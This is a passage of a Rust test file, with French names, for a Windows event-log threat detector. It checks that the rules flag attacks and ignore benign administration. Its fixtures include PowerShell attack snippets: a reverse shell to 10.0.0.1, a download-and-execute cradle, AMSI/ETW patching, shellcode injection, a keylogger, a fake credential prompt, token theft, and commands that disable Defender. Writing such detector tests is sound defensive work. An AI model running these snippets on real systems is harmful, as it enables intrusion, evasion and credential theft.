        mdp.manques.contains(&Manque::Vide("Security".into())),
        "{:?}",
        mdp.manques
    );
    assert!(mdp.manques.iter().any(|m| matches!(m, Manque::NonAudite { .. })));
    // Security se tait trois jours avant System.
    let muet = [
        sec(4624, 0, &[("LogonType", "5")]),
        ev("System", SCM, 7036, 3 * 86_400, &[]),
    ];
    let js = juger_nu(&muet, &tout_lu(), options());
    assert!(
        regle(&js, "EVT-ADM-001")
            .manques
            .iter()
            .any(|m| matches!(m, Manque::Muet { journal, .. } if journal == "Security"))
    );
    assert!(
        !regle(&js, "EVT-SRV-001")
            .manques
            .iter()
            .any(|m| matches!(m, Manque::Muet { .. }))
    );
    // L'audit des ouvertures de session réduit par un 4719 : les règles qui en dépendent ne sont plus vérifiées.
    let reduit = sec(
        4719,
        10,
        &[
            ("SubcategoryGuid", "{0CCE9215-69AE-11D9-BED3-505054503030}"),
            ("AuditPolicyChanges", "%%8448, %%8450"),
        ],
    );
    let js = juger(&[reduit]);
    for id in ["EVT-MDP-001", "EVT-RDP-001", "EVT-IDE-001"] {
        assert!(
            regle(&js, id)
                .manques
                .iter()
                .any(|m| matches!(m, Manque::AuditReduit { .. })),
            "{id}"
        );
    }
    assert!(regle(&js, "EVT-ADM-001").verifie());
}

#[test]
fn un_arret_n_excuse_que_ce_qu_il_peut() {
    let etats = avec_suite(suite(
        vec![
            trou(100, 199, Nature::Absents, 1000, 1100),
            trou(300, 5000, Nature::Absents, 5000, 5600),
        ],
        0,
    ));
    let mut abime = ev("System", "EventLog", 6008, 1050, &[]);
    abime.verifie = false;
    let grand = ev("System", "EventLog", 6008, 5500, &[]);
    let js = juger_avec(&[abime, grand], &etats, options());
    // Un arrêt d'un morceau abîmé n'excuse rien ; un vrai arrêt n'excuse pas 4 701 enregistrements.
    assert!(
        trouvailles(&js, "EVT-EFF-001")
            .iter()
            .all(|t| t.gravite == Gravite::Alerte)
    );
}

#[test]
fn a_la_borne_les_plus_graves_restent() {
    let bornes = BornesMoteur {
        trouvailles: 5,
        ..BornesMoteur::default()
    };
    let mut evs: Vec<EvenementWindows> = (0..20)
        .map(|i| sec(4720, i, &[("TargetUserName", &format!("c{i}"))]))
        .collect();
    evs.push(sec(4720, 100, &[("TargetUserName", "cache$")]));
    for ordre in [evs.clone(), evs.into_iter().rev().collect()] {
        let mut m = Moteur::nouveau(REGLES, options(), bornes.clone());
        for e in &ordre {
            m.recevoir(e);
        }
        let js = m.conclure(&tout_lu());
        let adm = regle(&js, "EVT-ADM-001");
        assert_eq!(adm.trouvailles.len(), 5);
        assert_eq!(adm.trouvailles[0].gravite, Gravite::Critique);
        assert_eq!((adm.au_dela, adm.au_dela_pire), (16, Some(Gravite::Info)));
    }
}

#[test]
fn une_critique_ne_se_declare_jamais_normale() {
    let mut evs: Vec<EvenementWindows> = (0..10).map(|i| echec(i * 30, "alice", "-", "3")).collect();
    evs.push(reussite(400, "alice", "-", "3"));
    let a = analyse(juger(&evs));
    let tout = |_: &str| true;
    let r = resultat::resultat(&a, (Utc::now(), std::time::Instant::now()), &tout);
    assert!(
        r.constats
            .iter()
            .any(|c| c.regle == "EVT-MDP-001" && c.niveau == Some(crate::risk::Niveau::Critique))
    );
}

#[test]
fn un_journal_meme_dans_une_archive_n_est_pas_le_journal() {
    let mut etats: Vec<EtatJournal> = tout_lu().into_iter().filter(|e| e.nom != "Security").collect();
    let mut melange = etat("Security", Lecture::Lu(Vec::new()), None);
    melange.principal = false;
    etats.push(melange);
    let js = juger_avec(&[], &etats, options());
    assert!(
        regle(&js, "EVT-ADM-001")
            .manques
            .contains(&Manque::Absent("Security".into()))
    );
}

#[test]
fn services_apres_relecture() {
    let g = |nom: &str, c: &str| service_suspect(nom, c).map(|x| x.0);
    // L'exception de Defender ancrée : le programme doit être dans son dossier.
    assert_eq!(
        g(
            "MpKslx",
            r"C:\Users\Public\evil.exe C:\ProgramData\Microsoft\Windows Defender\Definition Updates\"
        ),
        Some(Gravite::Alerte)
    );
    assert_eq!(
        g(
            "MpKsl1a2b",
            r"\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{X}\MpKslDrv.sys"
        ),
        None
    );
    assert_eq!(g("x", r"\\?\UNC\hote\p\x.exe"), Some(Gravite::Alerte));
    assert_eq!(g("x", r"\??\UNC\hote\p\x.exe"), Some(Gravite::Alerte));
    // Impacket et Metasploit : un nom au hasard à la racine de Windows.
    assert_eq!(g("WQxv", r"C:\Windows\aBcDeFgH.exe"), Some(Gravite::Alerte));
    assert_eq!(g("x", r"%SYSTEMROOT%\qwerty.exe"), Some(Gravite::Alerte));
    // Sysmon s'installe là, de Microsoft (vu dans un échantillon public).
    assert_eq!(g("Sysmon64", r"C:\Windows\Sysmon64.exe"), None);
    assert_eq!(g("SysmonDrv", r"C:\Windows\SysmonDrv.sys"), None);
    // Un pilote d'outil de matériel en dossier temporaire : à savoir, et un objet qui tient d'une version à l'autre.
    assert_eq!(
        g("cpuz154", r"\??\C:\Windows\TEMP\cpuz154\cpuz154_x64.sys"),
        Some(Gravite::Info)
    );
    assert_eq!(g("x", r"C:\Program Files\Riot Vanguard\vgk.sys"), Some(Gravite::Info));
    assert_eq!(
        g("x", r#""C:\Program Files\nodejs\node.exe" server.js"#),
        Some(Gravite::Alerte)
    );
    assert_eq!(
        g("x", r#""C:\Program Files\PowerShell Universal\Universal.Server.exe""#),
        None
    );
    let cpuz = |v: &str| {
        let e = ev(
            "System",
            SCM,
            7045,
            0,
            &[
                ("ServiceName", v),
                ("ImagePath", &format!(r"\??\C:\Windows\TEMP\{v}\{v}_x64.sys")),
            ],
        );
        trouvailles(&juger(&[e]), "EVT-SRV-001")[0].objet.clone()
    };
    assert_eq!(cpuz("cpuz154"), cpuz("cpuz160"));
}

#[test]
fn bits_et_scripts_apres_relecture() {
    assert_eq!(
        adresse_inhabituelle("https://drive.google.com/uc?export=download&id=1").map(|x| x.1),
        Some(Gravite::Alerte)
    );
    assert_eq!(
        adresse_inhabituelle("https://onedrive.live.com/download?cid=1").map(|x| x.1),
        Some(Gravite::Alerte)
    );
    assert_eq!(
        adresse_inhabituelle("http://wsus01:8530/Content/x.cab").map(|x| x.1),
        Some(Gravite::Info)
    );
    assert_eq!(
        adresse_inhabituelle("http://wsus.contoso.local/x").map(|x| x.1),
        Some(Gravite::Info)
    );
    assert_eq!(adresse_inhabituelle("https://aka.ms/x"), None);
    let cas = [
        ("# Download data from the API\nGet-Date", None),
        ("Remove-Item x -Confirm:$false; Invoke-Expression $commande", None),
        (
            "$a = [Ref].Assembly.GetType('System.Management.Automation.' + $n); $f = $a.GetField($c,'NonPublic,Static'); $f.SetValue($null,$true)",
            Some("amsi"),
        ),
        (
            "$k=[Kernel32]::GetProcAddress($h,'AmsiScan'+'Buffer'); [Kernel32]::VirtualProtect($k,5,0x40,[ref]0)",
            Some("amsi"),
        ),
        (
            "$a=[W]::GetProcAddress($h,'EtwEventWrite'); [W]::VirtualProtect($a,1,0x40,[ref]$o)",
            Some("memoire"),
        ),
        (
            "$c=New-Object Net.Sockets.TCPClient('10.0.0.1',443);$s=$c.GetStream();while(1){$d=(iex $t 2>&1)}",
            Some("outil"),
        ),
        (
            "Set-ItemProperty HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0",
            Some("desarme"),
        ),
        (
            "[IO.Compression.GZipStream]::new([IO.MemoryStream][Convert]::FromBase64String($b), 'Decompress')",
            None,
        ),
    ];
    for (texte, attendu) in cas {
        assert_eq!(script_suspect(texte).map(|x| x.0), attendu, "{texte}");
    }
    // PowerShell 2 lancé exprès : des données sans nom, telles que les écrit le journal « Windows PowerShell ».
    let mut v2 = ev(
        "Windows PowerShell",
        "PowerShell",
        400,
        0,
        &[("", "Available"), ("", "None")],
    );
    v2.champs.push((String::new(), "\tNewEngineState=Available\r\n\tHostVersion=2.0\r\n\tEngineVersion=2.0\r\n\tHostApplication=powershell -version 2\r\n".into()));
    let v5 = ev(
        "Windows PowerShell",
        "PowerShell",
        400,
        1,
        &[("", "\tEngineVersion=5.1.19041.1\r\n")],
    );
    let js = juger(&[v2, v5]);
    let t = trouvailles(&js, "EVT-PSH-001");
    assert_eq!(t.len(), 1);
    assert!(t[0].details.iter().any(|(_, v)| v.contains("-version 2")));
}

#[test]
fn defender_et_comptes_apres_relecture() {
    let echec_d = ev(DEF, DEFP, 1119, 0, &[("Threat Name", "Trojan:Win32/Exemple")]);
    let un = ev(
        DEF,
        DEFP,
        5007,
        1,
        &[(
            "New Value",
            "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableIOAVProtection = 1",
        )],
    );
    let zero = ev(
        DEF,
        DEFP,
        5007,
        2,
        &[(
            "New Value",
            "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableIOAVProtection = 0x0",
        )],
    );
    let falsification = ev(DEF, DEFP, 5013, 3, &[("Value", "DisableRealtimeMonitoring")]);
    let mut g = gravites(&juger(&[echec_d, un, zero, falsification]), "EVT-DEF-001");
    g.sort();
    assert_eq!(g, [Gravite::Alerte, Gravite::Alerte, Gravite::Critique]);
    // Trente échecs sur vingt heures, sous tout seuil de verrouillage ; un compte verrouillé.
    let lents: Vec<EvenementWindows> = (0..30).map(|i| echec(i * 2400, "alice", "-", "3")).collect();
    let js = juger(&lents);
    let t = trouvailles(&js, "EVT-MDP-001");
    assert!(t.iter().any(|t| t.volet == 4 && t.objet == "lent:alice"), "{t:#?}");
    // Une rafale rapide n'est pas dite une seconde fois en lente.
    let vite: Vec<EvenementWindows> = (0..40).map(|i| echec(i * 20, "bob", "-", "3")).collect();
    let js = juger(&vite);
    assert!(!trouvailles(&js, "EVT-MDP-001").iter().any(|t| t.objet == "lent:bob"));
    let verrou = sec(4740, 0, &[("TargetUserName", "alice"), ("TargetDomainName", "POSTE")]);
    assert_eq!(gravites(&juger(&[verrou]), "EVT-MDP-001"), [Gravite::Alerte]);
    // Un programme d'un profil (Teams) : à savoir ; un faux svchost dans un profil : se fait passer pour Windows.
    let par = |p: &str| sec(4648, 0, &[("ProcessName", p), ("TargetUserName", "a")]);
    let js = juger(&[
        par(r"C:\Users\bob\AppData\Local\Microsoft\Teams\current\Teams.exe"),
        par(r"C:\Users\bob\svchost.exe"),
    ]);
    let mut g = gravites(&js, "EVT-IDE-001");
    g.sort();
    assert_eq!(g, [Gravite::Info, Gravite::Alerte]);
}

// ---------------------------------------------------------------------------------------------------------------
// Un Windows tout juste installé : ce qu'écrivent la mise en route, ses modules et son serveur SSH, sans alerte ; et
// les attaques qui leur ressemblent, toujours en alerte
// ---------------------------------------------------------------------------------------------------------------

/// Un bloc de script de PowerShell 5.1, du niveau donné, avec ou sans fichier.
fn bloc_ps(s: i64, texte: &str, chemin: &str, niveau: u8) -> EvenementWindows {
    let mut e = ev(
        "Microsoft-Windows-PowerShell/Operational",
        "Microsoft-Windows-PowerShell",
        4104,
        s,
        &[
            ("MessageNumber", "1"),
            ("MessageTotal", "1"),
            ("ScriptBlockText", texte),
            ("ScriptBlockId", "{1}"),
            ("Path", chemin),
        ],
    );
    e.niveau = Some(niveau);
    e
}

#[test]
fn avertissements_de_powershell_sans_motif_regroupes() {
    let mut evs = Vec::new();
    // Comme les modules CDXML générés par Windows : chacun d'un texte différent, tous jugés suspects par PowerShell
    // (« Methods », « Properties », « Marshal »…), aucun motif d'attaque.
    for i in 0..300 {
        evs.push(bloc_ps(
            i,
            &format!(
                "#requires -version 3.0\ntry {{ Microsoft.PowerShell.Core\\Set-StrictMode -Off }} catch {{ }}\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\n$__cmdletization_methodParameter{i} = [Microsoft.PowerShell.Cmdletization.MethodParameter]::new(); [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])"
            ),
            "",
            3,
        ));
    }
    // Un script d'installation lancé à la main, trois fois.
    for i in 0..3 {
        evs.push(bloc_ps(
            400 + i,
            "powershell -ExecutionPolicy Bypass -File \"E:\\activer.ps1\"",
            r"E:\activer.ps1",
            3,
        ));
    }
    // De vraies attaques, elles aussi au niveau Avertissement : chacune reste une alerte, à part.
    let attaques = [
        (
            "$c=New-Object Net.WebClient;IEX $c.DownloadString('http://x.test/a')",
            "telecharge",
        ),
        (
            "$m=[Kernel32]::VirtualAlloc(0,$sc.Length,0x3000,0x40);[System.Runtime.InteropServices.Marshal]::Copy($sc,0,$m,$sc.Length);[Kernel32]::CreateThread(0,0,$m,0,0,0)",
            "memoire",
        ),
        (
            "$f=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p,[D]);$a=$k::VirtualAlloc(0,4096,0x3000,0x40)",
            "memoire",
        ),
        (
            "$cred=$Host.ui.PromptForCredential('Windows Security','Please enter user credentials','','');while($DS.ValidateCredentials($u,$cred.GetNetworkCredential().password) -ne $True){}",
            "hameconnage",
        ),
        (
            "[W]::DuplicateTokenEx($h,0xf01ff,0,2,1,[ref]$d);[W]::CreateProcessWithTokenW($d,0,'cmd.exe',$null,0,0,$null,[ref]$si,[ref]$pi)",
            "jeton",
        ),
        (
            "while($true){for($k=8;$k -le 254;$k++){if([U]::GetAsyncKeyState($k) -eq -32767){[U]::GetKeyboardState($s);[U]::ToUnicode($k,0,$s,$b,$b.Capacity,0)}}}",
            "clavier",
        ),
    ];
    for (i, (texte, _)) in attaques.iter().enumerate() {
        evs.push(bloc_ps(500 + i64::try_from(i).unwrap(), texte, "", 3));
    }
    let js = juger(&evs);
    let t = trouvailles(&js, "EVT-PSH-001");
    let sans = t.iter().find(|t| t.objet == "avertissement|sans-fichier").unwrap();
    assert_eq!((sans.gravite, sans.nombre), (Gravite::Info, 300));
    let fichier = t.iter().find(|t| t.objet == r"avertissement|e:\activer.ps1").unwrap();
    assert_eq!((fichier.gravite, fichier.nombre), (Gravite::Info, 3));
    for (texte, categorie) in attaques {
        assert!(
            t.iter()
                .any(|t| t.objet.starts_with(&format!("{categorie}|")) && t.gravite >= Gravite::Alerte),
            "{texte}"
        );
    }
    // Deux lignes d'information, et une alerte par attaque (les deux chargeurs en mémoire sont deux blocs).
    assert_eq!(t.iter().filter(|t| t.gravite == Gravite::Info).count(), 2, "{t:#?}");
    assert_eq!(t.len(), 2 + attaques.len(), "{t:#?}");
    // Le constat dit combien.
    let (constats, _) = resultat::constats(&analyse(js), &|_| false);
    let m = &constats
        .iter()
        .find(|c| {
            c.regle == "EVT-PSH-001" && (c.message.contains("aucun motif") || c.message.contains("no attack pattern"))
        })
        .unwrap()
        .message;
    assert!(m.contains("(300 "), "{m}");
}

#[test]
fn motifs_d_attaque_ajoutes_et_leurs_sosies_d_administration() {
    let cas = [
        (
            "$p=[W]::OpenProcess(0x1F0FFF,$false,$id);$m=[W]::VirtualAllocEx($p,0,$n,0x3000,0x40);[W]::WriteProcessMemory($p,$m,$sc,$n,[ref]0);[W]::CreateRemoteThread($p,0,0,$m,0,0,0)",
            Some("memoire"),
        ),
        // Des outils d'administration ou de Windows : les mêmes noms d'API, sans le geste d'attaque.
        (
            "Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern IntPtr GetForegroundWindow();' -Name W -Namespace U",
            None,
        ),
        (
            "$id=[Security.Principal.WindowsIdentity]::GetCurrent(); [W]::OpenProcessToken($h,8,[ref]$t)",
            None,
        ),
        (
            "$c = Get-Credential; New-PSDrive -Name S -PSProvider FileSystem -Root \\\\srv\\x -Credential $c; $c.GetNetworkCredential().UserName",
            None,
        ),
        ("[System.Runtime.InteropServices.Marshal]::AllocHGlobal(16)", None),
        ("if ([U]::GetAsyncKeyState(0x10)) { 'Maj' }", None),
    ];
    for (texte, attendu) in cas {
        assert_eq!(script_suspect(texte).map(|x| x.0), attendu, "{texte}");
    }
}

#[test]
fn identifiants_de_la_mise_en_route_et_du_serveur_ssh() {
    let par = |s, p: &str, compte: &str| {
        sec(
            4648,
            s,
            &[
                ("SubjectUserSid", "S-1-5-18"),
                ("ProcessName", p),
                ("TargetUserName", compte),
                ("TargetServerName", "localhost"),
            ],
        )
    };
    let js = juger(&[
        par(0, r"C:\Windows\System32\oobe\UserOOBEBroker.exe", "alice@example.test"),
        par(1, r"C:\Windows\System32\OpenSSH\sshd.exe", "sshd_4242"),
        par(2, r"C:\Windows\System32\OpenSSH\sshd.exe", "alice"),
        // Le même nom ailleurs : déguisé, ou d'un dossier où un compte ordinaire écrit.
        par(3, r"C:\ProgramData\UserOOBEBroker.exe", "alice"),
        par(4, r"C:\Users\alice\AppData\Local\Temp\UserOOBEBroker.exe", "alice"),
        par(5, r"C:\Windows\oobe\UserOOBEBroker.exe", "alice"),
        par(6, r"C:\Users\Public\sshd.exe", "alice"),
        // Hors de Program Files, un sshd.exe est déguisé (même dans System32, hors du dossier d'OpenSSH).
        par(8, r"C:\Windows\System32\sshd.exe", "alice"),
        par(9, r"C:\Outils\sshd.exe", "alice"),
        // OpenSSH de Microsoft installé à part (Program Files) : à savoir, pas déguisé.
        par(7, r"C:\Program Files\OpenSSH\sshd.exe", "sshd_77"),
    ]);
    let mut v: Vec<(String, Gravite)> = trouvailles(&js, "EVT-IDE-001")
        .iter()
        .map(|t| (t.objet.split('|').next().unwrap().to_string(), t.gravite))
        .collect();
    v.sort();
    assert_eq!(
        v,
        [
            (r"c:\outils\sshd.exe".to_string(), Gravite::Alerte),
            (r"c:\program files\openssh\sshd.exe".to_string(), Gravite::Info),
            (r"c:\programdata\useroobebroker.exe".to_string(), Gravite::Alerte),
            (
                r"c:\users\alice\appdata\local\temp\useroobebroker.exe".to_string(),
                Gravite::Alerte
            ),
            (r"c:\users\public\sshd.exe".to_string(), Gravite::Alerte),
            (r"c:\windows\oobe\useroobebroker.exe".to_string(), Gravite::Alerte),
            (r"c:\windows\system32\sshd.exe".to_string(), Gravite::Alerte),
        ]
    );
}

/// Le premier compte créé et mis administrateur par le compte de l'ordinateur, `s` secondes après `t0`.
fn premier_compte(s: i64, auteur: &str) -> Vec<EvenementWindows> {
    vec![
        sec(
            4720,
            s,
            &[
                ("SubjectUserSid", auteur),
                ("SubjectUserName", "POSTE-ALICE$"),
                ("SubjectDomainName", "WORKGROUP"),
                ("TargetUserName", "alice"),
                ("TargetSid", "S-1-5-21-1-2-3-1001"),
            ],
        ),
        sec(
            4732,
            s,
            &[
                ("SubjectUserSid", auteur),
                ("SubjectUserName", "POSTE-ALICE$"),
                ("SubjectDomainName", "WORKGROUP"),
                ("MemberName", "-"),
                ("MemberSid", "S-1-5-21-1-2-3-1001"),
                ("TargetUserName", "Administrateurs"),
                ("TargetSid", "S-1-5-32-544"),
            ],
        ),
    ]
}

/// Une ouverture de session au clavier.
fn session(s: i64, compte: &str, sid: &str) -> EvenementWindows {
    sec(
        4624,
        s,
        &[("LogonType", "2"), ("TargetUserName", compte), ("TargetUserSid", sid)],
    )
}

fn adm(evs: &[EvenementWindows], installation: Option<DateTime<Utc>>) -> Vec<Trouvaille> {
    let o = Options {
        installation,
        ..options()
    };
    let js = juger_avec(evs, &tout_lu(), o);
    trouvailles(&js, "EVT-ADM-001").to_vec()
}

fn admin_ajoute(t: &[Trouvaille]) -> &Trouvaille {
    t.iter()
        .find(|t| t.objet == "groupe:s-1-5-32-544:s-1-5-21-1-2-3-1001")
        .unwrap()
}

#[test]
fn premier_administrateur_cree_pendant_la_mise_en_route() {
    let installe = Some(t0());
    // Trois heures après l'installation (le compte choisi plus tard), avant toute session : la mise en route.
    let mut evs = premier_compte(3 * 3600, "S-1-5-18");
    // Le compte temporaire de la mise en route a ouvert une session avant : il ne compte pas.
    evs.push(session(600, "defaultuser0", "S-1-5-21-1-2-3-1000"));
    // Le nouveau compte ouvre sa session tout de suite après.
    evs.push(session(3 * 3600 + 20, "alice", "S-1-5-21-1-2-3-1001"));
    let t = adm(&evs, installe);
    let a = admin_ajoute(&t);
    assert_eq!(a.gravite, Gravite::Info);
    assert!(a.pourquoi.0.contains("pendant l'installation"), "{:?}", a.pourquoi);
    assert!(a.reserves.is_empty());
    let c = t.iter().find(|t| t.objet == "cree:alice").unwrap();
    assert!(c.pourquoi.0.contains("pendant l'installation"), "{:?}", c.pourquoi);
    // Le message le dit.
    let mut js = juger_avec(
        &evs,
        &tout_lu(),
        Options {
            installation: installe,
            ..options()
        },
    );
    js.retain(|j| j.regle.id == "EVT-ADM-001");
    let (constats, _) = resultat::constats(&analyse(js), &|_| false);
    assert!(
        constats
            .iter()
            .any(|c| c.message.contains("pendant l'installation de Windows")
                || c.message.contains("during Windows setup"))
    );
}

#[test]
fn premier_administrateur_hors_de_la_mise_en_route_reste_une_alerte() {
    let installe = Some(t0());
    // Un mois après l'installation : SYSTEM est aussi ce qu'obtient un attaquant.
    let t = adm(&premier_compte(30 * 86_400, "S-1-5-18"), installe);
    assert_eq!(admin_ajoute(&t).gravite, Gravite::Alerte);
    assert!(admin_ajoute(&t).reserves.is_empty());
    // Le jour même, mais après qu'une personne a ouvert sa session : la mise en route était finie.
    let mut evs = premier_compte(2 * 3600, "S-1-5-18");
    evs.push(session(3600, "bob", "S-1-5-21-1-2-3-1002"));
    assert_eq!(admin_ajoute(&adm(&evs, installe)).gravite, Gravite::Alerte);
    // Plus d'un jour avant la date d'installation (journal d'un autre Windows sur le même disque, horloge reculée).
    assert_eq!(
        admin_ajoute(&adm(&premier_compte(-2 * 86_400, "S-1-5-18"), installe)).gravite,
        Gravite::Alerte
    );
    // Une heure avant : InstallDate récrite par les mises à jour du premier jour (vu sur un vrai Windows 11).
    assert_eq!(
        admin_ajoute(&adm(&premier_compte(-3600, "S-1-5-18"), installe)).gravite,
        Gravite::Info
    );
    // Pendant l'installation, mais par un compte de personne (l'Administrateur intégré) : jamais la mise en route.
    let t = adm(&premier_compte(600, "S-1-5-21-1-2-3-500"), installe);
    assert_eq!(admin_ajoute(&t).gravite, Gravite::Alerte);
    assert!(admin_ajoute(&t).reserves.is_empty());
    // Pendant l'installation, par SYSTEM, mais aux utilisateurs du Bureau à distance : la mise en route ne le fait pas.
    let bureau = sec(
        4732,
        600,
        &[
            ("SubjectUserSid", "S-1-5-18"),
            ("MemberSid", "S-1-5-21-1-2-3-1001"),
            ("TargetSid", "S-1-5-32-555"),
        ],
    );
    let t = adm(&[bureau], installe);
    assert_eq!(t[0].gravite, Gravite::Alerte);
    // Un compte au nom en « $ » reste critique, même pendant l'installation.
    let cache = sec(
        4720,
        600,
        &[
            ("SubjectUserSid", "S-1-5-18"),
            ("TargetUserName", "aide$"),
            ("TargetSid", "S-1-5-21-1-2-3-1005"),
        ],
    );
    assert_eq!(adm(&[cache], installe)[0].gravite, Gravite::Critique);
}

#[test]
fn premier_administrateur_sans_date_d_installation() {
    // Un dossier rapporté, ou InstallDate illisible : l'alerte reste, avec ce qui l'explique peut-être.
    let t = adm(&premier_compte(600, "S-1-5-18"), None);
    let a = admin_ajoute(&t);
    assert_eq!(a.gravite, Gravite::Alerte);
    assert!(a.reserves.contains(&Reserve::MiseEnRoutePossible));
    let js = juger_avec(&premier_compte(600, "S-1-5-18"), &tout_lu(), options());
    let (constats, _) = resultat::constats(&analyse(js), &|_| false);
    assert!(
        constats
            .iter()
            .any(|c| c.message.contains("mise en route") || c.message.contains("Windows setup"))
    );
    // Par un autre compte : pas de réserve, rien ne l'explique.
    let t = adm(&premier_compte(600, "S-1-5-21-1-2-3-500"), None);
    assert!(admin_ajoute(&t).reserves.is_empty());
}

#[test]
fn module_de_defender_declare_sans_desarmer() {
    // Le module ConfigDefender que Windows génère (CDXML) déclare les réglages qu'il sait changer : PowerShell le
    // journalise dès qu'on s'en sert (Get-MpComputerStatus), sans que rien ne soit coupé.
    let module = [
        "    [Parameter(ParameterSetName='Set0')]\n    [Alias('drtm')]\n    [ValidateNotNull()]\n    [bool]\n    ${DisableRealtimeMonitoring},\n",
        "        if ($PSBoundParameters.ContainsKey('DisableArchiveScanning')) {\n          [object]$__cmdletization_value = ${DisableArchiveScanning}\n",
        "          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $__cmdletization_defaultValueIsPresent}",
    ];
    for texte in module {
        assert_eq!(script_suspect(texte).map(|x| x.0), None, "{texte}");
    }
    // Les mêmes réglages employés pour couper Defender : toujours une alerte.
    let coupe = [
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "Set-MpPreference -DisableBehaviorMonitoring:1",
        "Set-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name DisableRealtimeMonitoring -Value 1",
        "New-ItemProperty -Path $k -Name 'DisableScriptScanning' -Value 1 -PropertyType DWord",
        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableIOAVProtection /t REG_DWORD /d 1",
        "Invoke-CimMethod -Namespace root/Microsoft/Windows/Defender -ClassName MSFT_MpPreference -MethodName Set -Arguments @{DisableRealtimeMonitoring=$true}",
        "$p = Get-MpPreference; $p.DisableBlockAtFirstSeen = $true",
        "[Microsoft.Win32.Registry]::SetValue('HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender', 'Disable'+'RealtimeMonitoring', 1)",
    ];
    for texte in coupe {
        assert_eq!(script_suspect(texte).map(|x| x.0), Some("desarme"), "{texte}");
    }
}

#[test]
fn abonnement_wmi_de_windows_lui_meme() {
    let wmi = |consommateur: &str| {
        ev(
            "Microsoft-Windows-WMI-Activity/Operational",
            "Microsoft-Windows-WMI-Activity",
            5861,
            0,
            &[
                ("Namespace", "//./root/subscription"),
                ("CONSUMER", consommateur),
                (
                    "PossibleCause",
                    "Binding EventFilter: instance of __EventFilter { Name = \"SCM Event Log Filter\"; };",
                ),
            ],
        )
    };
    let js = juger(&[
        wmi("NTEventLogEventConsumer=\"SCM Event Log Consumer\""),
        wmi("CommandLineEventConsumer=\"SCM Event Log Consumer\""),
    ]);
    // Seul le consommateur qui écrit au journal est celui de Windows ; un homonyme qui lance une commande reste critique.
    assert_eq!(gravites(&js, "EVT-WMI-001"), [Gravite::Critique]);
    // Le même ailleurs que dans root\subscription : pas celui de Windows.
    let mut autre = wmi("NTEventLogEventConsumer=\"SCM Event Log Consumer\"");
    autre.champs.retain(|(n, _)| n != "Namespace");
    autre.champs.push(("Namespace".into(), "//./root/cimv2".into()));
    assert_eq!(gravites(&juger(&[autre]), "EVT-WMI-001"), [Gravite::Info]);
}

#[test]
fn hors_de_la_mise_en_route_la_raison_est_dite() {
    let mut evs = premier_compte(2 * 3600, "S-1-5-18");
    evs.push(session(3600, "bob", "S-1-5-21-1-2-3-1002"));
    let t = adm(&evs, Some(t0()));
    let a = admin_ajoute(&t);
    assert_eq!(a.gravite, Gravite::Alerte);
    let libelles: Vec<_> = a.details.iter().map(|(l, _)| *l).collect();
    assert!(libelles.contains(&super::moteur::Libelle::Installation), "{libelles:?}");
    assert!(
        libelles.contains(&super::moteur::Libelle::PremiereSession),
        "{libelles:?}"
    );
    // Un mois après, sans session : seulement la date d'installation.
    let t = adm(&premier_compte(30 * 86_400, "S-1-5-18"), Some(t0()));
    let libelles: Vec<_> = admin_ajoute(&t).details.iter().map(|(l, _)| *l).collect();
    assert!(libelles.contains(&super::moteur::Libelle::Installation));
    assert!(!libelles.contains(&super::moteur::Libelle::PremiereSession));
}

#[test]
fn mise_en_route_seulement_si_tout_le_dit() {
    let installe = Some(t0());
    let admis = |evs: &[EvenementWindows], o: Options| {
        let js = juger_avec(evs, &tout_lu(), o);
        admin_ajoute(trouvailles(&js, "EVT-ADM-001")).gravite == Gravite::Info
    };
    let o = || Options {
        installation: installe,
        ..options()
    };
    assert!(admis(&premier_compte(600, "S-1-5-18"), o()));
    // Le même ajout, une seconde fois par un autre compte : la trouvaille regroupée n'est plus la mise en route.
    let mut evs = premier_compte(600, "S-1-5-18");
    evs.extend(premier_compte(700, "S-1-5-21-1-2-3-500"));
    assert!(!admis(&evs, o()));
    // Un des événements sans date : il ne se place pas.
    let mut evs = premier_compte(600, "S-1-5-18");
    let mut sans_date = premier_compte(650, "S-1-5-18").remove(1);
    sans_date.date = None;
    evs.push(sans_date);
    assert!(!admis(&evs, o()));
    // Une session d'une personne sans date : peut-être avant.
    let mut evs = premier_compte(600, "S-1-5-18");
    let mut s = session(0, "bob", "S-1-5-21-1-2-3-1002");
    s.date = None;
    evs.push(s);
    assert!(!admis(&evs, o()));
    // Une session d'un compte Entra ID avant : la mise en route était finie.
    let mut evs = premier_compte(600, "S-1-5-18");
    evs.push(session(300, "bob@example.test", "S-1-12-1-1-2-3-4"));
    assert!(!admis(&evs, o()));
    // Un compte qui se fait appeler comme le compte temporaire, sans en avoir la forme : une session comme une autre.
    let mut evs = premier_compte(600, "S-1-5-18");
    evs.push(session(300, "defaultuser_bob", "S-1-5-21-1-2-3-1003"));
    assert!(!admis(&evs, o()));
    // Une session sur un autre nom de l'ordinateur (renommé pendant la mise en route) compte aussi.
    let mut evs = premier_compte(600, "S-1-5-18");
    let mut ailleurs = session(300, "bob", "S-1-5-21-1-2-3-1002");
    ailleurs.ordinateur = "DESKTOP-ESSAI".into();
    evs.push(ailleurs);
    assert!(!admis(&evs, o()));
    // Lu depuis une date plus récente que la fenêtre : les sessions d'avant n'ont pas été lues.
    let recent = Options {
        depuis: Some(t0() + Duration::hours(1)),
        ..o()
    };
    assert!(!admis(&premier_compte(2 * 3600, "S-1-5-18"), recent));
    // Un journal de sécurité qui commence bien avant l'installation dite : InstallDate récrite (un attaquant SYSTEM
    // la met à aujourd'hui), ou un Windows installé depuis longtemps.
